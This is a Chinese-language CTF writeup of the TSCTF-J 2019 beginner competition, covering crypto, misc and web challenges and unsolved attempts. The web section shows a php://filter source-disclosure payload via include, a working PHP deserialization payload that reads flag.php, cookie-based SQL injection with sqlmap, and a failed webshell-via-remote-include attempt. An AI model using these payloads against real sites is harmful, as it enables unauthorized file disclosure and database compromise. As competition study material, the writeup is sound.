---
title: TSCTF-J writeup
categories:
  - 比赛Writeup
tags:
  - ctf
  - Writeup
index_img: /img/used/comp.jpg
date: 2019-11-10 19:21:24

---

# TSCTF-J writeup

没做出来的题目花费的时间大概是做出来的三倍  

## crypto

### ezcrypto

构造反函数即可。反函数是一对一关系，不需要爆破。

```php
<?php
$miwen="a1zLbkKq0EJqagTLzWTq6OJMzETpyMzs";

function encode($str){
    $a=strrev($str);
    // echo $a;

    for($b=0;$b<strlen($a);$b++){

        $e=substr($a,$b,1);
        $c=ord($e)+1;
        $e=chr($c);
        $d=$d.$e;
    }
    return str_rot13(strrev(base64_encode($d)));
}

function decode($str){
    $l = str_rot13($str);
    $k = strrev($l);
    $d = base64_decode($k);
    
    for($b=0;$b<strlen($d);$b++){
        $e = substr($d,$b,1);
        $c = ord($e)-1;
        $e = chr($c);
        $dd = $dd.$e;
    }
    return strrev($dd);
}

echo(decode($miwen))
?>
```

### 诗集

搜原诗，比对。因为字数一致，上下ascii相减，发现替换规律。

### keyboard

直觉认为flag都是字母组成。猜测flag中有keyboard这个单词，进行比对，发现键盘单行轮换作为替换密钥的方法。

## misc

### 现场招新

PS题

### 流量分析

习惯性先找http流，在最后一个post请求发现jpg文件。wireshark预览直接发现flag。

### PNG

假设CRC准确，按crc修复图片，长宽都进行爆破。

```python
#python2
import os
import binascii
import struct
misc = open("对比一下.png","rb").read()
for i in range(2048):
    for j in range(2048):
        data = misc[12:16] + struct.pack('>i',i)+struct.pack('>i',j)+ misc[24:29]
        crc32 = binascii.crc32(data) & 0xffffffff
        if crc32 == 0xab8e66ed:
            print hex(i),hex(j)
```

两张修复完毕。二维码是29*29，进行生成，抠区域，PS上三个角。扫码即可。

### White and Black

修复依然是通过PS。选区域，拉伸。
扫不出来，收到题目启发，反色，就扫出来了。

## Web

### relax

信息收集：robots.txt发现三个隐藏目录。

```
User-agent: *
Disallow: /relax.php
Disallow: /heicore.php
Disallow: /flag.php
```

只有relax.php可访问。查看源码，发现表情包JS，进行解密，发现源码提示如下：

```php
//把变量名称替换了一下子
$a = $_GET['pw'];
$b = $_GET['file'];
$c = $_GET['(><)'];
if(isset($a)&&(file_get_contents($a,'r')==="Two thousand three hundred and thirty-three")){
    echo '<img src="./images/13.jpg" alt=""><br>';
    include($b);
    }else{
        echo '<img src="./images/1.gif" alt="">';
        }
```

看到include，构造包含获取flag，但不可访问。  
转换思路，构造php伪协议获取heicore.php和relax.php的源码，进一步了解程序逻辑。  

```php
//&file=php://filter/read=convert.base64-encode/resource=relax.php  
//relax.php
<?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
$_ = $_GET['pw'];
$__ = $_GET['file'];
$___ = $_GET['(><)'];

if(isset($_)&&(file_get_contents($_,'r')==="Two thousand three hundred and thirty-three")){
    echo '<img src="./images/13.jpg" alt=""><br>';
    if(preg_match("/flag/i",$__)){
        echo "It's not that simple";
        exit();
    }else{
        include($__);
        unserialize($___);
    }
}else{
    echo '<img src="./images/1.gif" alt="">';
}
?>
//&file=php://filter/read=convert.base64-encode/resource=heicore.php
//heicore.php
<?php
class Heicore{
    public $file;
    public function __destruct(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
        }
    }
}
?>
```

这次看到的是货真价实的源码了。  
通过反序列化后的析构函数进行利用即可。  
也不需要绕过 __wakeup  
`O:7:"Heicore":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}`  
得到flag。  

### Cookie


一上来就要登录。。。看了一圈源码也没什么思路，注入或爆破吧。  
尝试`")`这种闭合方法成功，进入了登录页面。  
此时很蒙，不知道flag应该在哪里。于是只好观察网页，有哪个漏洞利用哪个。  
发现增加了cookie，尝试删除，登录状态就消失了。  
随意修改cookie，出现了登录失败的Try again。  
看来cookie是要传入后台数据库的。尝试注入。base64加解密后，用order by尝试到4，有错误回显，证明有注入。接下来用Union联合注入尝试有没有回显的地方，但并没有发现回显，那只能进行布尔盲注了。  
然后开始写脚本。。  
写着写着发现自己有sqlmap这个工具，搜了一下用法后，利用--cookie和--tamper的功能进行自动化注入即可。  
flag在test表中的flag列。  
（貌似可以把flag删掉呢）  

## 后面是没做出来的  大概写写过程和思路

### bypass

三等号，只好爆破0e之md5了。

```python
import hashlib

ts = "tsctf"
cs = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

def check(plx):
    m = hashlib.md5()
    tss = ts+plx
    m.update(tss.encode("utf-8"))
    t = m.hexdigest()
    if t.startswith("0e"):
        print(m)
        print(m.hexdigest())
        return True
    else:
        return False

for x in cs:
    for y in cs:
        if check(x+y):
            print(ts+x+y)
            print("OK!")
            break
```

找到一个 tsctfMy
POST /?pass=aaaab6 & username=tsctfMy  

file_get_contents()这个函数。。先尝试了远程文件包含，包含自己服务器上的php脚本，但好像并没有写文件的权限？没成功生成一句话木马。  
然后尝试获取flag的文件，字典搜索没有结果。  
再然后尝试对index.php进行包含，因为这里的判断逻辑一定包含TSCTF-J{True_Flag}，所以尝试用php://filter，看里面有没有正则表达式过滤器，过滤到flag。  
查了很多资料和官方文档，没有找到构造这个filter的方法。。猜测语法是`php://filter/read=FILTER_VALIDATE_REGEXP,array("options"=>array("regexp"=>"/^TSCTF-J{\w+}/"))/resource=index.php`。但是并没有成功。  
就卡住了。

### HarukaRadio

binwalk/隐写/频谱查看字/慢放快放：失败
发现波形疏密不一，尝试按振幅划分/过滤噪音/纵波转横波进行莫斯代码转换均失败。  
波形太规律了，应该不会隐藏什么信息。如果是通过时间隐藏，阈值很难确定。仔细观察波形，发现好像是很多波形的叠加形成的，想到进行频率划分。  
当时大概画了这样一张图
![](https://s2.ax1x.com/2019/11/04/Kj5FWq.md.jpg)
好像是傅立叶变换，但是不会用c语言操作音频，又想到新生赛不能这么难，就没有继续尝试。  
由于不懂怎么用音频软件，把每个功能都试了一遍，其中有一个将音乐按两个频率的合成分开的功能，分开之后听音很像电话拨号的号码，于是按照频率和标准电话拨号音比对。人耳比对实在太难了。。。比对出一些数字，也不知道怎么作为flag，看来是思路错了。  
再次观察波形，感觉这些叠加的波形相互有一点点时间差，受物理实验李萨如图的启发，有没有可能是“扫描线”的思想。即把时间这一维映射到空间的第二维，就像提示中图片那样扫描出一张图。  
这个想法想来就不靠谱，而且操作难度过高，直接放弃了。。  
其他的提示也没看懂。  

### King of Kaomoji

前面的base64隐写都没有问题，base64隐写到了这句话：  
`:-)There is no flag,but a cute key:"hmz"`  
hmz表示什么呢，搜了好久都搜不到。  
看到html后面的一大段空白，他们是由三种字符组成的:"\t"," ","\r\n"。联系巅峰极客题目，将它们转化为01后的方法就叫做雪花加密，而题目提示了雪，确认思路（可能）正确。  
转换成01之后，大概长这样：
```
11101101111111011111101101100111110111101111
111101011111110101111011111011111011110111101
111100111111100111111011011101101101111111
1011111101111110111110011111110111110111111101111101
1111101111111011111110111111101111110111111101110101101111111
111110111101110111111011111101111111010011111110111
111111100101011011111110111111011100111111
11111011111110001111110111111101101110101111
1101111110111110111110110010111110111101
1111011111110001111101110111101101111101111
111111011011001111110111011110110111111101111
110011111011110101111110101111111010111
111011111110110111101110110011101101
1111111011111110110110111101101111110111111100111
001111111010111111101111100111111101101111
10010111110110011101111100111
0110111111100111100111110101111
01111011101101111110110111111001011
011101011111110011111101110110111111011111
1111110001111100111111101101111111011111101111111
1111101111111011111101111011111110101011110111111101111111
101111101011111101101111111011111011110111111101111
1011011101110101111101101111111011111101111111
```
共256行。尝试了各种分析方法，列举如下：  

1. 直接转换ascii：每行非8或7倍数，且1太多，替换之后0又太多。
2. 所有行连起来，共11350个字符，也不能整除8或7，强行转换后发现一些乱码，但大部分是空格。  
乱码进行各种加解密/转换，无果。  
空格也分“ ”和“\t”，联想到“雪花一片一片一片”，猜测是多次雪花加密，再次转换后得到的01串，转换ascii无果。
3.  “雪花一片一片一片”,猜测要每一行单独处理，而正好又有256行，所以很确信这个想法。但是统计每行字符数，按奇偶划分，转换ascii无果。统计每行0的个数，不是8就是9，用奇偶进行01的替换，转换ascii无果。尝试压缩算法，合并多个1，无果。
4. 猜测每一行会不会存在base64隐写。但按678均无法划分  

然后想到还有一个key：hmz没有用。

5. 猜测流密码加密。先尝试搜索hmz三个字母的ascii，搜不到几个。。用hmz这个串的ascii01序列异或，生成的字串相似度很高，看不出隐藏的信息。也想不到密码算法，于是搁置。  

思路大概就这么多了。。。

### 天气之子

预想算法1：  
预处理红色笔画的图片，检测边缘相似度（最长公共子序列除以边缘红色像素点均值），后来想到检测后建图强连通分量会有很多个，不知道顺序，就没有继续写  

预想算法2:  
找到原图，进行图像吸附操作。  
查了一下论文，这个复杂度好高，而且好难，放弃了

预想算法3:  
拼整个图，边缘用完整RGB表示，人工用机器学习的反馈思想寻找一个边缘匹配差值的bias。然后连边建图，PIL生成拼图。  
好像复杂度有点高，但应该差不多能跑完。  
有时间实现一下这个算法。

手动拼那就没有灵魂了
